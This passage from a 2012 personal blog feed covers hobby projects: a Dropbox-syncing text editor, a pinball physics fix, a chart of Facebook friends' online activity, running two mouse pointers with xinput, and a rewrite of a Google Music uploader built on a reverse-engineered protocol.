&lt;p&gt;Welcome to CloudFall. Yeah, I’m aware how dumb it sounds, but the fact that the new James Bond movie is going to be called Skyfall essentially demolishes any hope of using that name. But rather than using this as a vindication of how cool that name would be and abandoning it for some novel name, I’m just going to contrive something in a similar vain, hence the current working name. But rather than spending the first few lines complaining about the name of the product, I should probably lay down what exactly this project aims to be. It’s a text editor, not a terribly glamorous concept, I know, and this is especially not a terribly great time to start. This is hardly the first text editor, and certainly will not be the last (until this either never finishes or the world actually does end by the end of this year). It’s not the most full featured, but I guess it does need to have something which distinguishes it.&lt;/p&gt;
&lt;p&gt;The main feature is largely inherited from SourceKit, which is the ability to sync with Dropbox. And instead of editing “live” off of Dropbox’s servers, it really is more of a sync. It’s built around Chrome’s FileSystem API, so it has its own sandboxed imaginary folder where it sticks all the files. Every time a file is loaded, it’s first downloaded onto its spot on the imaginary folder and subsequent edits get sent to both the local copy and the server. This architecture, in theory, means it probably won’t inadvertently overwrite, corrupt or delete your important data in the advent of some syncing issues. It keeps track of the latest synced revisions and tells Dropbox’s API that information so that it won’t try overwriting a newer version from elsewhere and It’ll somewhat gracefully save to a different file in such a circumstance (though that routine can hardly be declared well tested, so beware of complications). It should in that way retain very close to full functionality while offline, since just about everything it does is entirely offline (including the compilation of CoffeeScript and LESS, which is explained later on).&lt;/p&gt;
&lt;p&gt;Built into the extension are a few of the tiny tweaks that I have installed on Sublime Text which I find fairly useful. For instance, the app includes a copy of the CoffeeScript and LESS compilers, and so whenever you are editing one of those types of files in the text editor, it’ll automatically compile and save it into the same directory whenever you hit the save key. That’s actually pretty useful because it gives CoffeeScript back that REPL (almost certainly a malapropism, but I’m not too familiar with developer work-cycle jargon, so please excuse that grievous offense) dynamic that JS developers are so familiar with. And to aid that sort of work, it can preview your files “live”, even offline. While it can’t open and edit binary files like pictures, it can still download and display them fine.&lt;/p&gt;
&lt;p&gt;For writing walls of text which don’t really need syntax highlighting (I wonder if someone has a package on mainstream text editors that syntax highlights free form English grammar, sort of like giving people synesthesia for no real reason), it includes a word count widget. Also, because I feel like encouraging unhealthy behavior, right next to the word count is an indication of your current typing speed. I’m pretty sure someone could go into some moral discussion into why it’s a completely detrimental addition to create something which displays how quickly the author is typing because it encourages a mindset which doesn’t focus on creating the most concise or effective means of delivery for some message, but rather promotes meaningless verbosity. But sometimes I would imagine using this for school assignments and the ilk, and maybe it would be nice to know when I’m reaching my designated quota filling some unwritten word requirement. I’m not quite sure how reliable of a word count it gives, since the algorithm is primitive and by no means nuanced, but it should be able to give a sort of rough estimate of the number of words on a page.&lt;/p&gt;
&lt;p&gt;I may have mentioned earlier that there are two primary systems for interacting with the application, both of which are keyboard shortcuts: Ctrl-O and Ctrl-P, meaning the file browser and the command palette, respectively. They both appear in the same sort of interface component and generally behave the same, but there are some slight differences in how they operate (obviously). There are actually two “browsing modes” for the file browser, where it shows files either from the local stored cache or online in Dropbox. That can be switched by selecting either “Browse Mode: Local Copy” or “Browse Mode: Remote Dropbox” from the command palette (though there should probably be some better interface logically placed on the file browser panel itself). Remote Dropbox only works when the user is online, so the default mode is the local one. The sole interface to this list of files is the filter search box on the bottom of that widget, where typing in stuff filters out things. Of the visible items, the cursor can be manipulated by using the arrow keys, and one of the options can be executed by hitting the enter key. The widget needs to be manually dismissed by hitting the Esc key (which allows you to semi-rapidly open several files or try different commands, like changing themes). When a folder is activated, the context then shifts to what is inside the folder, descending into the hierarchy. It’s possible to ascend by entering the directory “../“. To create a file or folder (Note that at time of writing, creating folders does not sync to Dropbox), just type “+yourfile.txt” (or if there are no search results, it’ll automatically select the option to create a file with that name). To delete a file, you likewise just prepend your command with a minus instead, for instance “-oldfile.txt”. It’s not nearly as counterintuitive or confusing as I presume this description is making it sound.&lt;/p&gt;
&lt;p&gt;The command palette, given that the interface is basically the same has much in common with the file system, but it’s entirely flat and linear. It lacks the hierarchy that plagues the file system, and navigating it is considerably simpler. Since the list is filtered and updated live with every keystoke, it’s fairly easy to find whatever command you’re looking for. The filtering algorithm only searches for characters but disregards gaps, only paying attention to order. In other words, the query “seals”, may match “SEt SyntAx: coLdfuSion”, it also means that you can construct very short queries to find what you want.&lt;/p&gt;
&lt;p&gt;At this point, I don’t think it’s a final project per se, there are still a few features are woefully dysfunctional like Find and Replace. But I think it fits my own use case, editing files on my Chromebook, even when offline. It’s fast and doesn’t take too many steps to start. But the interface isn’t exceedingly intuitive (Basically everything is accessed through two keyboard shortcuts). I haven’t found a witty logo for it (I just haven’t bothered looking), and at this point I’m just writing a blog post about it because I feel obligated to document whatever it is that I just did.&lt;/p&gt;
&lt;p&gt;Maybe some day I’ll pick it up again, or if there’s some response at all to this blog post, and add those awesome collaboration features (which probably won’t be very useful because the entire thing is quite hackish and not particularly kind to the prospect of improvements). Maybe I’ll fix up the search and replace interface (read: get rid of whatever horrid mess exists and replace it with a new one from scratch). And maybe I might publish it in some form that is significantly less involved than &lt;a href=&quot;https://github.com/antimatter15/cloudfall&quot;&gt;cloning off github&lt;/a&gt; and packaging the app yourself.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Pinball</title>
      <link>http://antimatter15.com/2012/06/pinball/</link>
      <pubDate>Mon, 18 Jun 2012 23:25:57 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/06/pinball/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.github.com/pinball/prototype.html&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Pinball/Screenshot-from-2012-06-19-152428-300x291.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot from 2012-06-19 15:24:28&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Last year, for Computer Science 1, I built a pinball game in Java. Yes, Java, as in sans-script. I wrote it in Eclipse and it was pretty functional. Of course, the biggest part of the game was the collision detection, collision detection which, mind you, I built with only the slightest knowledge of how it’s actually done. So yeah, I made up a scheme. It sucks, but at least it sort of works. I was actually fairly proud of it since it was basically the only thing which was mildly interesting and non teacher directed (that is, it took more than one hundred ninety two seconds to write after the teacher gave a cue to attempt the task). I thought it was so cool in fact, that I decided to port it over to both Javascript and Coffeescript, the latter being a language which was uber-hip and awesome (I believe these events transpired approximately at the time of Coffeescript’s big one-oh release).&lt;/p&gt;
&lt;p&gt;In essence, the collision detection scheme I devised was pretty simple. The ball experienced gravity in the form of a constant downward acceleration. It would move up and down. That was maintained by a variable (actually an array to mimic a vector), named position, and another one named velocity, where the y-coordinate for the latter was incremented by some term every time a frame was rendered. The collision detection system deals with the intersection between lines. First it takes the current position of the ball, and envisions that the current velocity is a line extending infinitely in that direction. All the other attributes of the environment are also lines, and the algorithm treats them all as unbounded (rather than segments). It quite trivially computes the intersection between the lines and calculates (with euclidean distance) how far that intersection is from the ball’s current point. If it detects a collision (the distance is less than the specified radius of the ball), then the ball’s direction is altered based on its current position and the tangent of the line it intersected with.&lt;/p&gt;
&lt;p&gt;Fast forward a few months, and it’s July of 2011. Since then, I’ve basically forgotten about the pinball game, because it really isn’t cool enough to be worth revisiting. But I was in Virginia’s Summer Residential Governor’s School for Science/Math/Technology (hardly wholly unexpected). It was some dark night and I was in the back row of a white shuttle bus en route to an observatory where artificial light is verboten. Well, it started raining and the trip was cancelled and we were going back and I was bored. So I pulled out my iPad, which I had for some reason, and decided to look at what I had on my Dropbox which I could play around with offline. Lo and behold, there’s a pretty crappy Javascript pinball implementation (which notably, never having been finished is just a ball bouncing between a few lines). I changed the parameters and made weird shapes the ball hopelessly bouncing around in awkward trajectories, and I thought it was cool.&lt;/p&gt;
&lt;p&gt;A friend, sitting next to me noticed that the balls were speeding up. He inquired whether or not I was using the euler method, and I didn’t know what that was. Either way, inadvertently, I was in fact using that. But the point was that here he was, making a fuss about the fact that my simulation in two dimensions blatantly ignores the conservation of momentum. And as such, I was compelled to finding a solution. I studied the code for a bit longer, trying to expose the nasty snippet which might have made it evade the laws of physics, albeit to no avail. In the midst of my struggle, he noticed at some point that since the trajectory paths are simple parabolas, it should be possible to find a closed form solution to the collision problem (rather than my iterative approach. In the end, I nobly gave up on my epic quest to fix the universe, and worked on some other crap.&lt;/p&gt;
&lt;p&gt;A week ago, I finished my first formal (that is, in school) calculus class, where I learned what euler’s method was and how I inadvertently implemented it. But I still had to take the class final, which the teacher rather kindly decided to make extremely easy. And since I also had a huge math portfolio (which I decided to typeset with LaTeX, as I have for nearly every paper this year, for no real reason whatsoever) due that day, he made it take home, with the only caveat that we aren’t to collaborate on the final in his presence (eg. after school in his room), a subtle nod of assent to all other forms of aid. Well, at home, I thought that I should probably make use of all the tools I have at my disposal. I thought of that copy of Mathematica which hopefully wasn’t collecting dust on my hard drive platter because that might lead to a head crash, but alas was figuratively gathering dust.&lt;/p&gt;
&lt;p&gt;I decided to start playing around with the awesomeness that is a computer algebra system, named after a guy whose last name is that otherwise inexplicable W on the periodic table (purely coincidental, unless Stephen Wolfram is actually a british iron manganese tungstate mineral). In what felt to be no time (at least it seemed interesting and productive enough that I in no way thought to discern the real time which elapsed), I had completed my final exam in a somewhat minimalistically formatted Mathematica notebook. I had, figuratively, fallen in love.&lt;/p&gt;
&lt;p&gt;Soon afterwards, as I was working on some other completely unrelated project (creating a intraframe-only WebM encoder), I needed something somewhat cool to generate a series of frames to be encoded into video. Digging through my (newly reorganized) Dropbox project folder, I found that old incomplete pinball game. And I remembered that story and that brief suggestion and decided to use my newfound Mathematica prowess (that is, my ability to use Solve[] with some degree of it not puking) to find that solution to the collision between a parabola and a line. To my dismay, Mathematica returned an ungodly mess of an equation. And it also didn’t work for vertical lines.&lt;/p&gt;
&lt;p&gt;But eventually, I did manage to get it to work. And thankfully now it obeys the laws of physics, at least to about 10x10^-13. And I also realized that that demo isn’t actually that cool but I used the older version anyway for my video encoder demo. So that’s the happy ending, everything lived happily ever after despite the fact the algorithm is still totally buggy and breaks when things are either too fast (velocity &amp;gt; 4000px/second) or too slow (velocity &amp;lt; 1px/second). And with corners, it occasionally fails. But I’m long since past the threshold of caring. At least now, you can speed it up a lot because the path prediction and the collision detection are completely separate from the render cycle (which also lets the speed become independent of processor speed). It uses requestAnimationFrame and other stuff, and if you want to try it, &lt;a href=&quot;http://antimatter15.github.com/pinball/prototype.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Visualizing Facebook Activity</title>
      <link>http://antimatter15.com/2012/05/visualizing-facebook-activity/</link>
      <pubDate>Tue, 29 May 2012 04:31:48 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/05/visualizing-facebook-activity/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Visualizing%20Facebook%20Activity/392722_2010404474880_380090264_n.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Visualizing%20Facebook%20Activity/392722_2010404474880_380090264_n-300x300.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;392722_2010404474880_380090264_n&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You might have noticed that I haven’t written much for this blog in the past few months. In truth, it’s because of school work, which has never really been something of an issue before. This is, quite probably the least productive stretch of time in my life thus far. I have a suspicion that this issue stems more psychologically than due to some radical increase in work load, but I haven’t looked in to testing that hypothesis (I’ve been collecting data hour-by-hour about what I’ve been doing in the past two years, so I could probably look into it if I were actually interested in that matter). But school’s nearing a close, and hopefully I can get back to a more productive lifestyle, maintaining my blog and most importantly, trying out cool things. I have a few things which I am working on at the moment which should be completed in the coming weeks (though I make no assurances). But since I have an internal goal for writing one blog post per month, I’m going to recycle a project from December of 2011.&lt;/p&gt;
&lt;p&gt;Nearly every day, I inevitably end up glancing at my Facebook “buddy list” of sorts, wondering how many people are online. It’s a figure which almost always seems to depend on the time of day, and behaves almost like clockwork, there’s always a massive swarm of people online around 10-11pm, and hardly anyone is ever online at 4 in the morning. I guess the problem with drawing any conclusions from this in particular is how specific a group this graphic represents. It constitutes my friends, and in particular, my Facebook friends. Essentially all of them are people I’ve encountered in real life, and may or may not actually find interest in. But the thing that unites just about everyone is that they’re generally high school aged.&lt;/p&gt;
&lt;p&gt;Before going on discussing how pretty of a chart this is, I think it’s worth going through what this chart actually represents. It’s quite easy to tell that this is in fact a polar chart, and on the inner circle, you can tell that it’s a 24 hour clock. Each of the rings represents a friend, and the rings are sorted by the total amount of time spent on Facebook in the given period. So you can see that toward the middle, the graph is almost opaque at every time, whereas on the fringes, the online activity is quite erratic and infrequent.&lt;/p&gt;
&lt;p&gt;So, where does this data come from? It’s actually quite simple to get from the Facebook API. I have a cron job which runs every minute to run a FQL request and save the results to a specific log file.&lt;/p&gt;
&lt;script src=&quot;https://gist.github.com/2828107.js?file=download.sh&quot;&gt;&lt;/script&gt;

&lt;p&gt;The actual FQL which runs in order to retrieve the list of online users is&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SELECT uid, name, online_presence FROM user  WHERE online_presence IN (‘active’, ‘idle’) AND uid IN (SELECT uid2 FROM friend WHERE uid1 = me())&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Basically, get the User ID, the name, and their online presence state for friends who are either active or idle in the list of the logged-in user. Since Facebook is an OAuth2-type API, you need an access token in order to do anything cool. I just use the &lt;a href=&quot;https://developers.facebook.com/tools/explorer/145634995501895/?method=GET&amp;amp;path=1686802955&quot;&gt;Facebook Graph API Explorer&lt;/a&gt; to generate my access tokens. Just go press “Get Access Token”, and select (at minimum) the permissions “user_online_presence”, “friends_online_presence” and “offline_access”. Then copy and paste the revealed token into some &lt;tt&gt;authkey.txt&lt;/tt&gt; and you should be set.&lt;/p&gt;
&lt;p&gt;I have a python script to go through the log file and to render it as the polar chart which is depicted on the top of the page. The code used for that is frankly atrocious and the output is even more so. Python Imaging Library is used, which is a lovely library, except not for drawing graphics. There isn’t any smoothing or anti-aliasing on the arcs drawn by PIL and they all look hideous. So I render the chart at some absurdly high resolution and down-resize it in GIMP while adding layering, blurs and opacity in order to make the picture somewhat less atrocious. Also, it does’t support restricting the app to drawing a specific day of the week, even though it might be interesting to see the how the trend differs on a weekday versus weekend.&lt;/p&gt;
&lt;p&gt;Something interesting about the appearance of the polar graph is that it almost resembles something of a digital fingerprint, and that brings up some interesting privacy considerations. Inside that graphic are the Facebook browsing habits of some two hundred people. There’s the question of how much this changes day by day for users, and to what extent this can be used to identify people. And even if a single ring doesn’t unambiguously represent a single person, the two hundred or so rings of their friends probably goes pretty far into identifying people. There’s also a striking amount of uniformity that says a lot about the type of people who I tend to associate with. Just at a glance, one can tell that there are very few people I’m friends with on Facebook who live in different timezones. Maybe what’s more dangerous than being able to identify a person is to be able to identify what kind of groups that person belongs to. And over the course of a day, just about everyone checks Facebook a few times. &lt;/p&gt;
</description>
    </item>
    <item>
      <title>Chrome Multitask Mode for Real with Multi-Pointer Xorg</title>
      <link>http://antimatter15.com/2012/04/chrome-multitask-mode-for-real-with-multi-pointer-xorg/</link>
      <pubDate>Tue, 03 Apr 2012 21:32:28 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/04/chrome-multitask-mode-for-real-with-multi-pointer-xorg/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Chrome%20Multitask%20Mode%20for%20Real%20with%20Multi-Pointer%20Xorg/Screenshot.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Chrome%20Multitask%20Mode%20for%20Real%20with%20Multi-Pointer%20Xorg/Screenshot.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Google’s multitask mode was only an April Fool’s joke, but inordinately amused among us (read: me) might even venture into attempting such an irrational feat. While watching the video, it evoked some memories of something which I had stumbled across a few years ago, called Multi-Pointer X. The rationale for creating that wasn’t nearly as insane as the Chrome Multitask video made it out to appear, instead I think it was just the framework to support multitouch and other sorts of alluring interactions on the Linux platform.&lt;/p&gt;
&lt;p&gt;So I decided to look into that again and within a few minutes of Googling, it appears that Multi-Pointer X has now been incorporated into the X.org mainline as part of XInput2. So what exactly does it take to conjure and insult the multitasking gods?&lt;/p&gt;
&lt;p&gt;The first step is quite logically to plug in another mouse. I happen to have three mice plugged into my computer anyway (there’s a perfectly logical rationale for how this came to be, my keyboard is some  wireless Microsoft keyboard+mouse set but I really hate the scrollbar on the Microsoft mouse, so I instead used another mouse for the longest time until it started failing and sheer lethargy prevailed over disconnecting that obsoleted peripheral) but regrettably, I don’t have an additional prehensile appendage to operate the third mouse.&lt;/p&gt;
&lt;p&gt;Right now I’m using a pretty much unmodified version of the latest version of Ubuntu 11.10. I just opened up a terminal window and typed in “&lt;tt&gt;xinput list&lt;/tt&gt;“&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='java'&gt;&lt;/span&gt;antimatter15&lt;span class=&quot;hljs-annotation&quot;&gt;@antimatter&lt;/span&gt;15-desktop:~/online$ xinput list
⎡ Virtual core pointer id=&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; [&lt;span class=&quot;hljs-function&quot;&gt;master &lt;span class=&quot;hljs-title&quot;&gt;pointer&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;)&lt;/span&gt;]
⎜ ↳ Virtual core XTEST pointer id&lt;/span&gt;=&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt; [&lt;span class=&quot;hljs-function&quot;&gt;slave &lt;span class=&quot;hljs-title&quot;&gt;pointer&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;]
⎜ ↳ A4Tech PS/2+USB Mouse id&lt;/span&gt;=&lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt; [&lt;span class=&quot;hljs-function&quot;&gt;slave &lt;span class=&quot;hljs-title&quot;&gt;pointer&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;]
⎜ ↳ Microsft Microsoft Wireless Optical Desktop® 2.20 id&lt;/span&gt;=&lt;span class=&quot;hljs-number&quot;&gt;11&lt;/span&gt; [&lt;span class=&quot;hljs-function&quot;&gt;slave &lt;span class=&quot;hljs-title&quot;&gt;pointer&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;]
⎜ ↳ USB Laser Wheel Mouse id&lt;/span&gt;=&lt;span class=&quot;hljs-number&quot;&gt;9&lt;/span&gt; [&lt;span class=&quot;hljs-function&quot;&gt;slave &lt;span class=&quot;hljs-title&quot;&gt;pointer&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;]
⎣ Virtual core keyboard id&lt;/span&gt;=&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt; [&lt;span class=&quot;hljs-function&quot;&gt;master &lt;span class=&quot;hljs-title&quot;&gt;keyboard&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;]
↳ Virtual core XTEST keyboard id&lt;/span&gt;=&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt; [&lt;span class=&quot;hljs-function&quot;&gt;slave &lt;span class=&quot;hljs-title&quot;&gt;keyboard&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;)&lt;/span&gt;]
↳ Power Button id&lt;/span&gt;=&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt; [&lt;span class=&quot;hljs-function&quot;&gt;slave &lt;span class=&quot;hljs-title&quot;&gt;keyboard&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;)&lt;/span&gt;]
↳ Power Button id&lt;/span&gt;=&lt;span class=&quot;hljs-number&quot;&gt;7&lt;/span&gt; [&lt;span class=&quot;hljs-function&quot;&gt;slave &lt;span class=&quot;hljs-title&quot;&gt;keyboard&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;)&lt;/span&gt;]
↳ Microsft Microsoft Wireless Optical Desktop® 2.20 id&lt;/span&gt;=&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt; [&lt;span class=&quot;hljs-function&quot;&gt;slave &lt;span class=&quot;hljs-title&quot;&gt;keyboard&lt;/span&gt; &lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;)&lt;/span&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;/articles/2012/Chrome%20Multitask%20Mode%20for%20Real%20with%20Multi-Pointer%20Xorg/Screenshot1.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Chrome%20Multitask%20Mode%20for%20Real%20with%20Multi-Pointer%20Xorg/Screenshot1.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;Use the command “&lt;tt&gt;xinput create-master Auxiliary&lt;/tt&gt;“ in order to create a new input device, and try running “&lt;tt&gt;xinput list&lt;/tt&gt;“ again to confirm that the command has done your bidding.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='groovy'&gt;&lt;/span&gt;antimatter15&lt;span class=&quot;hljs-annotation&quot;&gt;@antimatter&lt;/span&gt;15-&lt;span class=&quot;hljs-string&quot;&gt;desktop:&lt;/span&gt;~/online$ xinput create-master Auxiliary
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now it’s time for the third (or is it fourth) and final step, to reattach one of those master pointers into the auxiliary pointer. To do that, pick out some mouse. For me, I picked my “&lt;tt&gt;A4Tech PS/2+USB Mouse&lt;/tt&gt;“ which is was my mouse with a broken scroll wheel. You can see that it’s been given &lt;tt&gt;ID=8&lt;/tt&gt;, so that’s the number I’ll be using for the next step.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='groovy'&gt;&lt;/span&gt;antimatter15&lt;span class=&quot;hljs-annotation&quot;&gt;@antimatter&lt;/span&gt;15-&lt;span class=&quot;hljs-string&quot;&gt;desktop:&lt;/span&gt;~/online$ xinput reattach &lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;Auxiliary pointer&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And then I can now use two mice at the same time for whatever ungodly purpose I desire.&lt;/p&gt;
&lt;p&gt;It’s hard to take screenshots since it appears that every screenshotting or screencasting app which I can find seems to make the wholly unwarranted assumption that a desktop computer only has one cursor, but it does actually work. Though I don’t think I’ll ever be able to multitask through this scheme, it’s mentally jarring in far too many ways.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>MusicAlpha v2.0</title>
      <link>http://antimatter15.com/2012/03/musicalpha-v2-0/</link>
      <pubDate>Thu, 29 Mar 2012 04:44:45 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/03/musicalpha-v2-0/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/obojocfchdgdpgcigcdhdnlakfcbbgfn&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/MusicAlpha%20v2.0/Screenshot.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/obojocfchdgdpgcigcdhdnlakfcbbgfn&quot;&gt;&lt;strong&gt;MusicAlpha&lt;/strong&gt; &lt;/a&gt;works again, and this wasn’t some minor update that fixed a small hole, the entire app has been rewritten. There’s a new user interface which has really quite beautiful animated polar progress bars, but the most significant part is that the mystical protobufs-over-https protocol has been decoded and documented.&lt;/p&gt;
&lt;p&gt;It really started on January 30th, when &lt;a href=&quot;https://github.com/simon-weber&quot;&gt;Simon Weber&lt;/a&gt; contacted me for information on the upload process because his &lt;a href=&quot;https://github.com/simon-weber/Unofficial-Google-Music-API&quot;&gt;Unofficial-Google-Music-API&lt;/a&gt; received various user requests to implement uploading. I remembered a message sent a little while earlier offering help decoding the protobufs and tried out the method described, which involved using a disassembler to patch the curl_easy_setopt method to disable checking of SSL certificates. This turned out to be the trick and I used Fiddler to collect a few dumps of data for subsequent analysis. That was really quite a magical moment because everything afterwards was relatively straightforward. The huge stumbling block which had prohibited progress for these past months had been lifted and the task which was left, of reverse engineering the protocol, seemed eminently viable. With only minor hiccups over the next few days, I built a python prototype of the program. I created a .proto file which was somewhat human readable with field names based on guesses.We realized some pretty cool things or at least got a much better understanding of how Google Music seems to work (This blog post was started in the early part of February, but I’m finishing this up halfway through March).&lt;/p&gt;
&lt;p&gt;For instance, the reason Music Manager doesn’t work on virtual machines is because they use the computer’s MAC address as a system for identifying individual devices. They have a cap on the number of devices which can be authorized to manage your music, which is currently set to 10. This caused a bit of confusion when I hit that device cap while testing (At one point I assumed that the MAC-esque field was actually a random string, so after fifteen or so tests everything started silently failing). However, it occurs to me that it isn’t particularly interesting to read the narrative of how exactly the current version of the application has come to exist. The technical overview of how the actual protocol works can be found on the &lt;a href=&quot;https://github.com/antimatter15/google-music-protocol&quot;&gt;google-music-protocol&lt;/a&gt; project page on Github. It includes a brief overview of the mechanism as well as sections which detail the specific messages which are sent to the server and also includes a simple reference implementation. Hopefully it should be enough information for anyone who is actually interested in doing something which relates to it (though I am curious if anyone could possibly create something interesting out of it, please contact me if you decide to do anything at all with it). So at this point, I’d like to skip over to the actual application-specific aspect: MusicAlpha itself. This is the story of how the rewrite came to be, and the rather lengthy time it took to to write this blog post describing it.&lt;/p&gt;
&lt;p&gt;One of the first things I realized was that the entire application would essentially need to be rewritten. The code dealt primarily with altering the attributes of a song by mimicking the web client’s interface, something which wouldn’t be very useful now that all the metadata is sent via the magical protobufs scheme. Since that code gets scrapped, I figured why not scrap the rest. I wrote the first version while experimenting with darker color schemes and obscenely prominent border radii and gradients. I’m not sure that I can say it’s objectively better, but it does look a bit more interesting, especially that big two-ringed polar chart.&lt;/p&gt;
&lt;p&gt;There’s some text to the right side, but it’s not particularly of interest. There’s a big file selection button, but that’s pretty uninteresting. Embroidered on the solid gray backdrop is the logo, a simple and unchanged music symbol- unchanged from the last version. I used, for the first time, custom web typography. Just some fancy looking sans-serif fonts I picked from Google’s Font Library. On the old application, I had two progress bars to show the upload progress, one is for individual songs and the other is the overall progress. I wanted to portray upload progress in a manner which was somewhat smoother and more aesthetically alluring than a mere linear bar.&lt;/p&gt;
&lt;p&gt;In trying to create that better progress bar, I created a polar progress bar in canvas. All updates are smoothly interpolated and watching the bars spin around and invert is somewhat reminiscent to staring at an old record spin on a turntable, something which I’ve only seen a few times in my (rather short, at this moment) life, but magical enough to still inspire a sense of nostalgia.&lt;/p&gt;
&lt;p&gt;Central to making an aesthetically appealing polar chart is making the animation smooth. This might be doable through various esoteric CSS transforms, but I’m not particularly knowledgeable in that area, and I’m not a huge fan of crafting elaborate animations with CSS. It lacks a certain amount of control (which manually updating and redrawing affords) and tends to feel extremely sluggish on computers which lack extremely modern graphics cards (such as mine). Since things like uploading a file involves a lot of guesswork and various aspects of the upload process are very much stochastic (ie. waiting for the server to respond), the smoothing system needs to be able to create a nice smooth animation out of highly erratic information. But it also needs to simultaneously relay information without having an excessive amount of lag.&lt;/p&gt;
&lt;p&gt;In order to strike a sort of balance, it uses an interpolation algorithm which was employed in Steve Wittens’&lt;a href=&quot;http://acko.net/blog/js1k-demo-the-making-of/&quot;&gt; js1k entry&lt;/a&gt; and you can see &lt;a href=&quot;https://gist.github.com/2236530&quot;&gt;my code&lt;/a&gt; here. In order to minimize the CPU tax of running such an animation, it uses the HTML5 requestAnimationFrame function. This has the nice side effect that when you leave it uploading in the background for a while, it automatically stops updating the animation and quickly slides into position when you return.&lt;/p&gt;
&lt;p&gt;There are two rings, the outer one being dark gray and the inner one being a somewhat lighter shade of gray (fitting into the mostly unsaturated theme of the interface). The outer ring represents the total upload progress while the inner ring represents the progress of an individual file. The outer ring “spins” in a sense, in a clockwise manner while the inner ring rotates in the opposite direction. Every time a ring completes a revolution, it “inverts”, for instance, when the outer ring fills up and becomes a solid circle, the ring begins to open from the opposite direction so that the imaginary end of the rotation continues unimpeded. The animation is somewhat difficult to describe in words so here’s a &lt;a href=&quot;http://dl.dropbox.com/u/1024307/musicalpha/animation.html&quot;&gt;demo of the progress animation&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;When the page first loads, the polar plot exists in the background, behind the prominent logo. It represents the song quota, the percentage out of the 20,000 song quota which Google Music imposes.&lt;/p&gt;
